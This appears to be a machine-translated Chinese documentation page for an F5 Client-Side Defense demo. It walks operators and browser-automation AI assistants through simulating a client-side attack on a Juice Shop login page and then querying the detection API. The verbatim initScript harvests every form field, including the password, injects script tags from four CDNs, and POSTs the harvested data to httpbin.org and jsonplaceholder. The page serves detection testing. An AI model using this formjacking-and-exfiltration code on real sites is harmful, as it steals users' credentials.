@@ -1,0 +1,257 @@
+---
+title: 阶段 2 — 攻击
+description: 使用预构建脚本模拟客户端攻击流量以触发 CSD 检测
+sidebar:
+  order: 3
+  label: 阶段 2 — 攻击
+i18n:
+  sourceHash: 7f35d419bf2b
+  translator: machine
+---
+
+import { Aside, Steps } from "@astrojs/starlight/components";
+
+阶段 2 针对受保护应用程序生成模拟攻击流量，并确认 CSD 检测到了它。阶段 1 必须完成 — 所有步骤 7 检查均需 PASS — 才能继续。
+
+## 步骤 8：攻击模拟
+
+<Aside type="note">
+此步骤需要浏览器端 JavaScript 执行 — `curl` 无法触发 CSD 检测。具有浏览器自动化工具的 AI 助手（MCP Chrome DevTools、Playwright、Puppeteer）使用下面的 **AI 自动化执行** 序列直接执行这些步骤。没有浏览器自动化的操作人员执行手动步骤。
+</Aside>
+
+在基础设施验证后（所有阶段 1 步骤 7 检查均 PASS），运行攻击模拟脚本以生成 CSD 检测。这些脚本在 [触发检测](/csd/trigger-detection/) 指南和 [攻击脚本库](/csd/attack-scripts/) 中定义。
+
+### AI 自动化执行
+
+具有浏览器自动化工具的 AI 助手以编程方式运行攻击模拟：
+
+1. **使用 initScript 导航** — 首先导航到 `about:blank` 以确保文档上下文干净（避免来自先前导航的过期 initScript），然后使用 `initScript` 通过 `navigate_page` 导航到 `http://$F5XC_DOMAINNAME/#/login`，该脚本在 zone.js 修补前保存原生 `setInterval`、`clearInterval`、`fetch` 和 `console.log`，轮询登录表单字段，通过原生 `HTMLInputElement.prototype.value` 设置器填充凭证，并立即内联执行组合检测脚本。使用下面的逐字 initScript。
+2. **关闭欢迎横幅** — 使用 `Escape` 键按 `press_key` 以关闭欢迎横幅。在后续访问时，横幅可能不会出现（cookie 已持久化）。cookie 同意对话框由 Escape 键自动关闭
+3. **等待完成** — 等待 10 秒以使所有 CDN 脚本加载/错误回调和 fetch promise 解析完成
+4. **捕获证据** — `list_console_messages` 以检查 `[CSD Demo] Simulation complete` 和 CDN 加载结果；`list_network_requests` 过滤到 `script` 和 `fetch` 类型以验证 HTTP 状态码（`200`/`201` 表示成功，`pending` 表示保留请求）
+
+**阶段 2 initScript（逐字 — 完全按照书写使用）：**
+
+```javascript
+// Save native references before zone.js patches them
+var _si = window.setInterval.bind(window);
+var _ci = window.clearInterval.bind(window);
+var _fetch = window.fetch.bind(window);
+var _log = window.console.log.bind(window.console);
+
+// Poll for login form fields, fill credentials, run detection script
+var _poll = _si(function() {
+  var emailEl = document.querySelector('#email');
+  var passEl  = document.querySelector('#password');
+  if (emailEl && passEl) {
+    _ci(_poll);
+    // Fill credentials via native setter (bypasses zone.js)
+    var nativeSet = Object.getOwnPropertyDescriptor(
+      window.HTMLInputElement.prototype, 'value').set;
+    nativeSet.call(emailEl, 'test@example.com');
+    emailEl.dispatchEvent(new Event('input', { bubbles: true }));
+    nativeSet.call(passEl, 'P@ssword123');
+    passEl.dispatchEvent(new Event('input', { bubbles: true }));
+
+    // Run Combined Detection Script inline using native fetch for exfil
+    (function() {
+      _log('==================================================');
+      _log('[CSD Demo] Combined Detection Script — Starting');
+      _log('==================================================');
+
+      _log('\n[Formjack] Phase 1: Form field harvesting');
+      var inputs = document.querySelectorAll('input');
+      var harvested = {};
+      inputs.forEach(function(input) {
+        var name = input.name || input.id || input.type;
+        harvested[name] = input.value || '(empty)';
+      });
+      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);
+
+      _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
+      var cdns = [
+        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
+        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
+        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
+        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
+      ];
+      cdns.forEach(function(cdn) {
+        var script = document.createElement('script');
+        script.src = cdn.url;
+        script.onload = function() { _log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url); };
+        script.onerror = function() { _log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url); };
+        document.head.appendChild(script);
+        _log('[Supply Chain] Injected script tag: ' + cdn.name);
+      });
+
+      _log('\n[Exfil] Phase 3: Data exfiltration');
+      var payload = JSON.stringify({
+        type: 'combined_demo', credentials: harvested,
+        page: window.location.href, timestamp: Date.now()
+      });
+      _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
+        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });
+      _fetch('https://jsonplaceholder.typicode.com/posts', {
+        method: 'POST', mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' }, body: payload
+      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });
+
+      _log('\n==================================================');
+      _log('[CSD Demo] Simulation complete');
+      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
+      _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
+      _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
+      _log('==================================================');
+    })();
+  }
+}, 300);
+```
+
+<Aside type="caution">
+**zone.js 不兼容** — Juice Shop 使用 Angular 的 zone.js，它会修补 `setTimeout`、`setInterval`、`fetch`、`XMLHttpRequest` 和其他浏览器 API。这会导致 MCP `evaluate_script`、`fill` 和 `click` 工具失败，错误信息为 `Cannot read properties of undefined (reading 'call')`。改用 `navigate_page` 和 `initScript` — `initScript` 在 zone.js 加载前运行，因此您可以保存原生 API 引用并在轮询回调中使用它们。initScript 必须使用原生 `HTMLInputElement.prototype.value` 设置器（而不是 `fill`）填充表单字段，并内联运行检测脚本（不通过可能在页面加载后被 zone.js 拦截的 `setTimeout`）。详见 [触发检测 — AI 自动化执行](/csd/trigger-detection/#ai-automated-execution)。
+</Aside>
+
+<Aside type="note">
+**initScript 累积** — 每个带 `initScript` 参数的 `navigate_page` 调用都会将脚本添加到在每次后续文档加载时运行的持久列表中。为避免过期脚本干扰，可在运行之间导航到 `about:blank` 或对新页面使用 `new_page` 与 `isolatedContext` 以获得干净的浏览器上下文。
+</Aside>
+
+<Aside type="note">
+**在 initScript 中保存原生 `fetch`** — initScript 在 zone.js 修补前保存 `window.fetch.bind(window)`。这可确保 fetch 调用正确工作，不会出现 zone.js `Cannot read properties of undefined` 错误。相同的 initScript（保存了原生 `fetch`）用于阶段 2 和阶段 3 攻击运行 — CSD 缓解不拦截 `fetch()` 调用，因此保存原生引用不会影响缓解行为。
+</Aside>
+
+<Aside type="caution">
+**瞬时源 404** — 首次导航到 Angular 应用程序时，`polyfills.js` 或其他应用脚本可能从源服务器返回瞬时 HTTP 404。这会导致 Angular 引导失败，显示空白页面且没有登录表单。404 是临时的 — 后续请求返回 200 或 304。**恢复：** 导航到 `about:blank`，等待 2 秒，然后重试导航。如果问题在多次重试后仍然存在，通过负载均衡器路径检查源健康状况（`curl -s -o /dev/null -w '%{http_code}' http://$F5XC_DOMAINNAME/polyfills.js`）。
+</Aside>
+
+### 手动执行
+
+没有浏览器自动化工具的操作人员手动执行这些步骤：
+
+1. **导航** 到受保护应用程序登录页面：`http://xF5XC_DOMAINNAMEx/#/login`
+2. **输入虚拟凭证** — 在电子邮件字段中输入 `test@example.com`，在密码字段中输入 `P@ssword123`（不提交表单）
+3. **打开 DevTools** — 按 **F12** 并切换到 **Console** 标签页
+4. **运行组合检测脚本** — 将 [触发检测 — 运行组合模拟脚本](/csd/trigger-detection/#run-the-combined-simulation-script) 中的脚本粘贴到控制台并按 Enter
+5. **验证控制台输出** — 确认 `[CSD Demo]` 分阶段输出显示：字段收集、来自 4 个 CDN 域的脚本注入，以及向 2 个端点的数据泄露
+
+### 触发内容
+
+| 信号 | 行为 | 检测 |
+| --- | --- | --- |
+| 表单字段收集 | 读取电子邮件和密码输入值 | 脚本读取敏感表单字段 — 标记为高风险 |
+| 脚本注入 | 从 `cdn.jsdelivr.net`、`esm.sh`、`unpkg.com`、`ga.jspm.io` 注入 4 个 `<script>` 标签 | 检测到最多 4 个新的第三方脚本域（CDN 可用性可能不同） |
+| 数据泄露 | 通过 `fetch` 将收集的数据发送到 `www.httpbin.org` 和 `jsonplaceholder.typicode.com` | 外部域的网络调用 |
+
+<Aside type="note">
+**CDN 可用性可能不同。** 并非所有 4 个 CDN 脚本都会在每次运行中加载 — 浏览器资源限制、网络条件或 CDN 限流可能导致某些失败，出现 `ERR_INSUFFICIENT_RESOURCES` 或超时。如果**任何** CDN 脚本加载，模拟就会成功。CSD 检测注入尝试，无论脚本是否成功加载 — `<script>` 标签的创建本身就是检测信号。
+
+在严重情况下，`ERR_INSUFFICIENT_RESOURCES` 可能升级为页面级失败 — 整个页面变为空白，屏幕截图超时，`take_snapshot` 失败。这通常在同一浏览器上下文中多次导航且重型 initScript 累积后发生。**恢复：** 使用 `new_page` 和 `isolatedContext` 创建新的浏览器上下文，然后从 `about:blank` → `navigate_page` 与 initScript 序列重试。这与不影响模拟成功的单个 CDN 脚本失败不同。
+</Aside>
+
+<Aside type="tip">
+运行攻击模拟后，使用此确定性轮询循环等待检测：
+
+1. 每 60 秒查询一次 `/detected_domains`
+2. 如果 DET-3 通过（泄露域出现在 `/detected_domains` 中），立即继续步骤 9
+3. 如果 10 次查询（10 分钟）后仍为空，检查 CSD 状态（阶段 1 步骤 5）和受保护域注册（阶段 1 步骤 6） — 其中一个可能配置错误
+4. 如果 30 次查询（30 分钟）后仍为空，停止并向操作人员报告 — 不继续阶段 3
+
+有关其他针对性模拟（单个攻击类别、最大检测压力测试），详见 [攻击脚本库](/csd/attack-scripts/)。
+</Aside>
+
+### 证据
+
+AI 助手应报告以下内容。对于 AI 自动化执行，证据通过 `list_console_messages`（initScript 的轮询函数向控制台记录结果）以编程方式捕获。对于手动执行，操作人员读取浏览器控制台输出。
+
+| 检查 | 预期 | 状态 |
+| --- | --- | --- |
+| 登录页面已加载 | `http://$F5XC_DOMAINNAME/#/login` 返回 `200 OK` | PASS / FAIL |
+| 控制台脚本已执行 | 控制台输出中出现 `[CSD Demo] Simulation complete` | PASS / FAIL |
+| 字段已收集 | 控制台输出中的计数 > 0 | PASS |
+| 脚本已注入 | 控制台输出中出现 1–4 个 CDN 域（某些可能因资源错误而失败） | 如果出现任何 CDN 域则 PASS |
+| 泄露通道 | 控制台输出中显示 2 个 fetch POST 尝试 | PASS |
+
+<Aside type="tip">
+如果 HTTPS LB 证书有效（`CertificateValid`），您可以选择也对 `https://$F5XC_DOMAINNAME/#/login` 运行模拟。这不是演示进展所必需的。
+</Aside>
+
+## 步骤 9：通过 API 的检测验证
+
+查询 CSD API 端点以确认检测出现。使用轮询循环：每 60 秒查询一次 `/detected_domains`；DET-3 通过后立即继续。如果 DET-3 在 10 分钟内未通过，检查 CSD 配置。如果 DET-3 在 30 分钟内未通过，停止并向操作人员报告。这些端点记录在 [API 参考](/csd/api-reference/) 中，使用与前面步骤相同的身份验证和命名空间。
+
+<Aside type="note">
+**端点处理顺序：** `/detected_domains` 首先被填充，是 CSD 管道正在工作的主要指标。`/scripts` 和 `/formFields` 在较慢的后端处理计划上被填充，即使在多次模拟运行后也可能保持空白 20–30 分钟。如果 `/detected_domains` 显示泄露域（`www.httpbin.org`、`jsonplaceholder.typicode.com`），将模拟视为成功检测并继续 — 下面的 DET-1 检查反映了这一点。
+</Aside>
+
+### 检测到的脚本
+
+查询过去 24 小时内检测到的脚本：
+
+```bash
+NOW=$(date +%s)
+START=$(( NOW - 86400 ))
+curl -s -X POST \
+  -H "Authorization: APIToken xF5XC_API_TOKENx" \
+  -H "Content-Type: application/json" \
+  -d "{\"startTime\": \"$START\", \"endTime\": \"$NOW\"}" \
+  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/scripts" \
+  | jq '{total: (.scripts | length), scripts: [.scripts[]? | {script_name: .script_name, risk_level: .risk_level}]}'
+```
+
+| 字段 | 预期 | 状态 |
+| --- | --- | --- |
+| `total` | > 0（检测到脚本） | 如果 > 0 则 PASS；如果为 0 但 `/detected_domains` 显示泄露域则 PENDING |
+| 脚本名称 | 在 `script_name` 中包括 CDN 域（`cdn.jsdelivr.net`、`esm.sh`、`unpkg.com`、`ga.jspm.io`） | 如果注入的 CDN 域出现则 PASS |
+
+### 检测到的域
+
+```bash
+curl -s \
+  -H "Authorization: APIToken xF5XC_API_TOKENx" \
+  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/detected_domains" \
+  | jq '{total_domains: .domain_summary.totalDomains, domains: [.domains_list[]? | {domain: .domain, category: .category}]}'
+```
+
+| 字段 | 预期 | 状态 |
+| --- | --- | --- |
+| `total_domains` | > 0 | 如果 > 0 则 PASS |
+| 域列表 | 包括 CDN 和泄露域 | 如果预期域出现则 PASS |
+
+### 表单字段
+
+```bash
+NOW=$(date +%s)
+START=$(( NOW - 86400 ))
+curl -s \
+  -H "Authorization: APIToken xF5XC_API_TOKENx" \
+  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/formFields?startTime=$START&endTime=$NOW" \
+  | jq '{total: .total_size, fields: [.form_fields[]? | {name: .name, sensitivity: .analysis.value, scripts: (.associated_scripts | length), locations: .locations}]}'
+```
+
+| 字段 | 预期 | 状态 |
+| --- | --- | --- |
+| `total` | > 0 | 如果 > 0 则 PASS；如果为 0 但 DET-3 通过则 PENDING |
+| `name` | 包括 `email`、`password` | 如果敏感字段出现则 PASS |
+| `sensitivity` | 电子邮件/密码字段为 `Sensitive` | 如果 ML 分类正确则 PASS |
+
+<Aside type="note">
+**表单字段处理比域检测慢。** `/formFields` 端点在首次查询时可能返回字段时元数据不完整。ML 敏感性分类（`Sensitive` 与 `Not Sensitive`）在后端处理完成后填充 — 这可能在首次模拟运行后需要 20–30 分钟。如果字段显示但缺少分类，稍后重新查询。DET-3（`/detected_domains`）是主要通过标准。
+</Aside>
+
+### 阶段 2 证据汇总
+
+在所有检测查询后，显示最终检测状态：
+
+| 测试 ID | 检查 | 状态 |
+| --- | --- | --- |
+| DET-1 | 检测到脚本（`/scripts` 端点） | 如果 > 0 则 PASS；如果为空但 DET-3 通过则 PENDING |
+| DET-2 | 检测到 CDN 域 | PASS / FAIL |
+| DET-3 | 检测到泄露域（`/detected_domains`） | **主要指标** — 如果出现 `www.httpbin.org` 或 `jsonplaceholder.typicode.com` 则 PASS |
+| DET-4 | 检测到表单字段（`/formFields` 端点） | 如果 > 0 则 PASS；如果为空但 DET-3 通过则 PENDING |
+
+<Aside type="note">
+**继续阶段 3 的最小通过标准：** DET-3 必须 PASS（泄露域在 `/detected_domains` 中可见）。DET-1 和 DET-4 在首次使用或新重建后可能显示 PENDING — 这是正常的。如果 DET-3 在 30 分钟后也显示 FAIL，请验证 CSD 已启用（阶段 1 步骤 5）、受保护域已注册（阶段 1 步骤 6），以及 CSD JS 标签被注入（阶段 1 步骤 7 JS 配置检查）。
+</Aside>
+
+---
+
+**阶段 2 完成。** 继续进行 [阶段 3 — 缓解](/csd/demo/phase-3-mitigate/) 以应用缓解规则并验证域被阻止。
